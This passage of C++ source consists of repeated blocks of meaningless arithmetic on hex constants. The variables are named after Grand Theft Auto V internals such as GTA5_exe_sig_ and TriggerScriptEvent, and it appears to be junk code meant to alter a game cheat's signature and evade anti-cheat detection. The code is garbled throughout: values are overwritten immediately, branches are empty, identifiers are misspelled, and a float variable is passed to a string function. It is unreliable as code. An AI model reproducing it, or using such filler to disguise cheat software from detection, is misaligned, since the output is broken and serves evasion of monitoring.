						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						a = Extern_Reader::StringManager::ReplaceWord(a, "</X>", "");
						std::string b = a;

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
